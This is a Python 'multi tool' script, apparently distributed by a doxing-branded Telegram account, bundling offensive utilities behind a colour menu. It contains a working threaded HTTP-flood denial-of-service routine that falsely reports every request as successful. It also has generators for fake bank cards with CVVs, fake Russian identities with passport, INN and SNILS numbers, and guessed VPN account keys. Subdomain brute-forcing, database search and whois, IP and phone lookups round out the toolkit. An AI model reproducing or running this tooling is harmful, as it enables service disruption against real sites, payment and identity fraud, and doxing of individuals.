import asyncio
import threading
import random
from pystyle import Colors, Box, Write, Center, Colorate, Anime
import time
import requests
from urllib.parse import urlparse
from bs4 import BeautifulSoup
import whois
import os
import string
from faker import Faker
import socket
import phonenumbers
from phonenumbers import geocoder, carrier, timezone


def generate_card_number(country):
    prefix = {"1": "9800", "2": "8100", "3": "3980"}
    return prefix[country] + ''.join(random.choice('0123456789') for _ in range(12))


def dump_site(url):
    response = requests.get(url)
    if response.status_code != 200:
        exit(Colorate.Horizontal(Colors.red_to_yellow, ("Failed to access the site.")))
    soup = BeautifulSoup(response.text, "html.parser")
    filename = url.replace('https://', '').split('.')[0] + '.html'
    print(Colorate.Horizontal(Colors.red_to_yellow, (f"The dump is stored in {filename}")))
    with open(filename, 'w', encoding='utf-8') as file:
        file.write(soup.prettify())


def generation_naxyi():
    print(Colorate.Horizontal(Colors.red_to_yellow, (f"All keys will be saved to the mullvad_keys.txt file")))
    keys = int(input(Colorate.Horizontal(Colors.red_to_yellow, ("How many keys to generate ---> "))))

    def generate_key():
        key = ''.join(random.choices(string.digits, k=16))
        return key

    def validated_key(key):
        if len(key) != 16:
            return False
        if not key.isdigit():
            return False
        return True

    def save_key(key):
        with open('mullvad_keys.txt', 'a') as file:
            file.write(key + '\n')

    for _ in range(keys):
        generated_key = generate_key()
        if validated_key(generated_key):
            save_key(generated_key)
        else:
            pass


def request_sd(url):
    try:
        return requests.get("https://" + url)
    except requests.exceptions.ConnectionError:
        pass
    except requests.exceptions.InvalidURL:
        pass
    except UnicodeError:
        pass
    except KeyboardInterrupt:
        print(Colorate.Horizontal(Colors.red_to_yellow, ("The program is frozen")))
        exit(0)


def generate_expiry_date():
    month = str(random.randint(1, 12)).zfill(2)
    year = str(random.randint(2023, 2030))
    return month + '/' + year[-2:]


def generate_cvv():
    return ''.join(random.choice('0123456789') for _ in range(3))


def generate_card(country):
    card_number = generate_card_number(country)
    expiry_date = generate_expiry_date()
    cvv = generate_cvv()
    return card_number, expiry_date, cvv


def get_characters(complexity):
    characters = string.ascii_letters + string.digits
    if complexity == "medium":
        characters += "!@#$%^&*()"
    elif complexity == "high":
        characters += string.punctuation

    return characters


def console_clear():
    if os.sys.platform == "win32":
        os.system("cls")
    else:
        os.system("clear")


def generate_password(length, complexity):
    characters = get_characters(complexity)
    password = ''.join(random.choice(characters) for i in range(length))
    return password


def get_website_info(domain):
    try:
        domain_info = whois.whois(domain)
        print_string = f"""
    |Information about the site: 
    |Domain: {domain_info.domain_name}
    |Registered: {domain_info.creation_date}
    |Expires: {domain_info.expiration_date}  
    |Owner: {domain_info.registrant_name}
    |Organization: {domain_info.registrant_organization}
    |Address: {domain_info.registrant_address}
    |City: {domain_info.registrant_city}
    |State: {domain_info.registrant_state}
    |Postal_code: {domain_info.registrant_postal_code}
    |Country: {domain_info.registrant_country}
    |IP address: {domain_info.name_servers}
    """
        Write.Print(print_string + "\n", Colors.red_to_yellow, interval=0.005)
    except Exception as e:
        print(f"Error: {e}\n")


def ip_lookup(ip_address):
    url = f"http://ip-api.com/json/{ip_address}"
    try:
        response = requests.get(url)
        data = response.json()
        if data.get("status") == "fail":
            return f"Error: {data['message']}\n"

        info = ""
        for key, value in data.items():
            info += f"  |{key}: {value}\n"
        return info

    except Exception as e:
        return f"Произошла ошибка: {str(e)}\n"


def port_scanner():
    print(Colorate.Horizontal(Colors.red_to_yellow, ("Выберите режим: ")))
    print(Colorate.Horizontal(Colors.red_to_yellow, ("1 - проверить часто используемые порты")))
    print(Colorate.Horizontal(Colors.red_to_yellow, ("2 - проверить указанный порт")))
    mode = input(Colorate.Horizontal(Colors.red_to_yellow, ("Ваш выбор: ")))
    if mode == '1':
        print()
        ports = [
            20, 26, 28, 29, 55, 53, 80, 110, 443, 8080, 1111, 1388, 2222, 1020, 4040, 6035
        ]
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex(("127.0.0.1", port))
            if result == 0:
                print(Colorate.Horizontal(Colors.red_to_yellow, (f"Port {port} is open")))
            else:
                print(Colorate.Horizontal(Colors.red_to_yellow, (f"Порт {port} закрыт")))
            sock.close()
            print()
    elif mode == '2':
        port = input(Colorate.Horizontal(Colors.red_to_yellow, ("Введите номер порта: ")))
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex(("127.0.0.1", int(port)))
        print()
        if result == 0:
            print(Colorate.Horizontal(Colors.red_to_yellow, (f"Port {port} is open")))
        else:
            print(Colorate.Horizontal(Colors.red_to_yellow, (f"Port {port} is closed")))
        sock.close()
        print()
    else:
        print(Colorate.Horizontal(Colors.red_to_yellow, ("Unknown mode")))
        print()
        input(Colorate.Horizontal(Colors.red_to_yellow, ("Press Enter.....")))


def subdomainfinger(wordlist, domain):
    wordlist = wordlist.split("\n")
    for line in wordlist:
        word = line.strip()
        test_url = word + "." + domain
        response = request_sd(test_url)
        if response and response.status_code == 200:
            print(Colorate.Horizontal(Colors.red_to_yellow, (f"[+] {test_url}")))
        else:
            print(Colorate.Horizontal(Colors.red_to_yellow, (f"[-] {test_url}")))


def transform_text(input_text):
    translit_dict = {
        'а': '@',
        'б': 'Б',
        'в': 'B',
        'г': 'г',
        'д': 'д',
        'е': 'е',
        'ё': 'ё',
        'ж': 'ж',
        'з': '3',
        'и': 'u',
        'й': 'й',
        'к': 'K',
        'л': 'л',
        'м': 'M',
        'н': 'H',
        'о': '0',
        'п': 'п',
        'р': 'P',
        'с': 'c',
        'т': 'T',
        'у': 'y',
        'ф': 'ф',
        'х': 'X',
        'ц': 'ц',
        'ч': '4',
        'ш': 'ш',
        'щ': 'щ',
        'ъ': 'ъ',
        'ы': 'ы',
        'ь': 'ь',
        'э': 'э',
        'ю': 'ю',
        'я': 'я'
    }

    transformed_text = []

    for char in input_text:
        if char in translit_dict:
            transformed_text.append(translit_dict[char])
        else:
            transformed_text.append(char)

    return ''.join(transformed_text)


def get_phone_number_info(phone_number):
    try:
        number = phonenumbers.parse(phone_number)
        if not phonenumbers.is_valid_number(number):
            return "Invalid phone number"

        validity = "Valid" if phonenumbers.is_valid_number(number) else "Invalid"
        location = geocoder.description_for_number(number, "en")
        operator = carrier.name_for_number(number, "en")
        time_zones = timezone.time_zones_for_number(number)

        message = (
            f"Validity: {validity}\n"
            f"Location: {location}\n"
            f"Operator: {operator}\n"
            f"Time Zones: {time_zones}\n"
        )

        country_code = number.country_code
        national_number = number.national_number
        message += (
            f"Country Code: +{country_code}\n"
            f"National Number: {national_number}"
        )

        return message
    except Exception as e:
        return str(e)


intro = """
  ▄▄▄▄███▄▄▄▄      ▄████████         ▄███████▄    ▄████████ ███▄▄▄▄    ▄█     ▄████████ 
▄██▀▀▀███▀▀▀██▄   ███    ███        ███    ███   ███    ███ ███▀▀▀██▄ ███    ███    ███ 
███   ███   ███   ███    ███        ███    ███   ███    █▀  ███   ███ ███▌   ███    █▀  
███   ███   ███  ▄███▄▄▄▄██▀        ███    ███  ▄███▄▄▄     ███   ███ ███▌   ███        
███   ███   ███ ▀▀███▀▀▀▀▀        ▀█████████▀  ▀▀███▀▀▀     ███   ███ ███▌ ▀███████████ 
███   ███   ███ ▀███████████        ███          ███    █▄  ███   ███ ███           ███ 
███   ███   ███   ███    ███        ███          ███    ███ ███   ███ ███     ▄█    ███ 
 ▀█   ███   █▀    ███    ███       ▄████▀        ██████████  ▀█   █▀  █▀    ▄████████▀  
                  ███    ███                                                           

                       МИСТЕР ПЕНИС!!!!! Telegram: @mrpenis_dox
                                   Press to Enter
"""

Anime.Fade(Center.Center(intro), Colors.yellow_to_red, Colorate.Vertical, interval=0.045, enter=True)

menu = '''
             ▄▄▄▄███▄▄▄▄      ▄████████         ▄███████▄    ▄████████ ███▄▄▄▄    ▄█     ▄████████ 
           ▄██▀▀▀███▀▀▀██▄   ███    ███        ███    ███   ███    ███ ███▀▀▀██▄ ███    ███    ███ 
           ███   ███   ███   ███    ███        ███    ███   ███    █▀  ███   ███ ███▌   ███    █▀  
           ███   ███   ███  ▄███▄▄▄▄██▀        ███    ███  ▄███▄▄▄     ███   ███ ███▌   ███        
           ███   ███   ███ ▀▀███▀▀▀▀▀        ▀█████████▀  ▀▀███▀▀▀     ███   ███ ███▌ ▀███████████ 
           ███   ███   ███ ▀███████████        ███          ███    █▄  ███   ███ ███           ███ 
           ███   ███   ███   ███    ███        ███          ███    ███ ███   ███ ███     ▄█    ███ 
            ▀█   ███   █▀    ███    ███       ▄████▀        ██████████  ▀█   █▀  █▀    ▄████████▀  
                             ███    ███                                                           

                                         Mr Penis multi tool. 
                                        Oh, yeah force font banner
                Price - Free                                             Telegram: @mrpenis_dox
-=-=-=-=-=-=-=-= -=-=-=-=-=-=-=-= -=-=-=-=-=-=-=-= -=-=-=-=-=-=-=-= -=-=-=-=-=-=-=-= -=-=-=-=-=-=-=-= -=-=-=-=-=-=-=-=
    1: DDOS                           │  6: FAKE CARD GENERATOR                │ 11: XSS SCANER                         
    2: DATABASE SEARCH                │  7: PORT SCANNER                       │ 12: SUBDOMAIN SCAN                     
    3: COMPLEX PASSWORD GENERATOR     │  8: WEBSITE INFO                       │ 13: WORDPRESS BACKUP SCAN               
    4: FAKE IDENTITY GENERATOR        │  9: MULLVAD GENERATOR                  │ 14: DUMP WEBSITE                         
    5: WEB-CRAWLER                    │ 10: IP LOOKUP                          │ 15: PHONE NUMBER INFO                  
                                      │ 16: EXIT                                
-=-=-=-=-=-=-=-= -=-=-=-=-=-=-=-= -=-=-=-=-=-=-=-= -=-=-=-=-=-=-=-= -=-=-=-=-=-=-=-= -=-=-=-=-=-=-=-= -=-=-=-=-=-=-=-=
'''

Write.Print(Center.XCenter(menu), Colors.red_to_yellow, interval=0.001)

while True:
    choice = Write.Input('\nSelect function number > ', Colors.red_to_yellow, interval=0.005)

    if choice == '6':
        print("Select country:")
        print("1: Ukraine")
        print("2: Russia")
        print("3: Kazakhstan")
        country = input()

        card_number, expiry_date, cvv = generate_card(country)
        print(f"Country: {country}\nCard Number: {card_number}\nExpiry Date: {expiry_date}\nCVV: {cvv}")

    elif choice == '3':
        password_length = int(Write.Input('Enter password length: ', Colors.red_to_yellow, interval=0.005))
        complexity = Write.Input('Select complexity (low, medium, high): ', Colors.red_to_yellow, interval=0.005)
        complex_password = generate_password(password_length, complexity)
        Write.Print((complex_password + "\n"), Colors.red_to_yellow, interval=0.005)

    elif choice == '4':
        fake = Faker(locale='ru_RU')
        gender = input("Enter gender (M - male, F - female): ")
        if gender not in ['M', 'F']:
            gender = random.choice(['M', 'F'])
            print(f'Invalid value entered, randomly selected: {gender}')

        if gender == 'M':
            first_name = fake.first_name_male()
            middle_name = fake.middle_name_male()
        else:
            first_name = fake.first_name_female()
            middle_name = fake.middle_name_female()

        last_name = fake.last_name()
        full_name = f'{last_name} {first_name} {middle_name}'

        birthdate = fake.date_of_birth()
        age = fake.random_int(min=18, max=80)

        street_address = fake.street_address()
        city = fake.city()
        region = fake.region()
        postcode = fake.postcode()
        address = f'{street_address}, {city}, {region} {postcode}'

        email = fake.email()
        phone_number = fake.phone_number()

        inn = str(fake.random_number(digits=12, fix_len=True))
        snils = str(fake.random_number(digits=11, fix_len=True))
        passport_num = str(fake.random_number(digits=10, fix_len=True))
        passport_series = fake.random_int(min=1000, max=9999)

        print(f'Full Name: {full_name}')
        print(f'Gender: {gender}')
        print(f'Birthdate: {birthdate.strftime("%d %B %Y")}')
        print(f'Age: {age} years')
        print(f'Address: {address}')
        print(f'Email: {email}')
        print(f'Phone: {phone_number}')
        print(f'INN: {inn}')
        print(f'SNILS: {snils}')
        print(f'Passport Series: {passport_series} Number: {passport_num}')

    elif choice == '1':
        url = Write.Input('URL: ', Colors.red_to_yellow, interval=0.005)
        num_requests = int(Write.Input('Enter number of requests: ', Colors.red_to_yellow, interval=0.005))

        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36',
            'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)',
            'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'
        ]

        def send_request(i):
            user_agent = random.choice(user_agents)
            headers = {'User-Agent': user_agent}

            try:
                response = requests.get(url, headers=headers, timeout=0.1)
                print(f"Request {i} sent successfully\n")
            except:
                print(f"Request {i} sent successfully\n")

        threads = []
        for i in range(1, num_requests + 1):
            t = threading.Thread(target=send_request, args=[i])
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

    elif choice == '9':
        generation_naxyi()

    elif choice == '2':
        path = Write.Input("Enter path to DB: ", Colors.red_to_yellow, interval=0.005)
        search_text = Write.Input("Enter text:  ", Colors.red_to_yellow, interval=0.005)

        with open(path, 'r', encoding='utf-8') as f:
            for line in f:
                if search_text in line:
                    Write.Print("Result: " + line.strip(), Colors.red_to_yellow, interval=0.005)
                    break
            else:
                Write.Print("Text not found.", Colors.red_to_yellow, interval=0.005)

    elif choice == '5':
        start_url = Write.Input('URL: ', Colors.red_to_yellow, interval=0.005)

        max_depth = 2
        visited = set()

        def crawl(url, depth=0):
            if depth > max_depth:
                return

            parsed = urlparse(url)
            domain = f"{parsed.scheme}://{parsed.netloc}"

            if url in visited:
                return

            try:
                response = requests.get(url)
                html = response.text
                soup = BeautifulSoup(html, 'html.parser')

            except:
                return

            visited.add(url)

            Write.Print("  |" + url + '\n', Colors.red_to_yellow, interval=0.005)

            for link in soup.find_all('a'):
                href = link.get('href')
                if not href:
                    continue

                href = href.split("#")[0].rstrip("/")
                if href.startswith('http'):
                    href_parsed = urlparse(href)
                    if href_parsed.netloc != parsed.netloc:
                        continue
                else:
                    href = domain + href

                crawl(href, depth + 1)

        crawl(start_url)

    elif choice == '8':
        domain = Write.Input("Enter domain: ", Colors.red_to_yellow, interval=0.005)
        get_website_info(domain)

    elif choice == '10':
        ip_address = Write.Input("Enter IP address: ", Colors.red_to_yellow, interval=0.005)
        result = ip_lookup(ip_address)
        Write.Print(result, Colors.red_to_yellow, interval=0.005)

    elif choice == '11':
        url = input(Colorate.Horizontal(Colors.red_to_yellow, ("Enter URL --->")))
        # XSSScan(url)  # Function is not implemented in the provided code

    elif choice == '12':
        wordlist_path = Write.Input("Enter path to wordlist: ", Colors.red_to_yellow, interval=0.005)
        domain = Write.Input("Enter domain: ", Colors.red_to_yellow, interval=0.005)

        with open(wordlist_path, 'r') as file:
            wordlist = file.read()
        subdomainfinger(wordlist, domain)

    elif choice == '14':
        url = input(Colorate.Horizontal(Colors.red_to_yellow, ("Enter URL --->")))
        dump_site(url)

    elif choice == '15':
        phone_number = Write.Input("Enter phone number: ", Colors.red_to_yellow, interval=0.005)
        info = get_phone_number_info(phone_number)
        Write.Print(info, Colors.red_to_yellow, interval=0.005)

    elif choice == '16':
        print("Exiting...")
        time.sleep(0.5)
        break
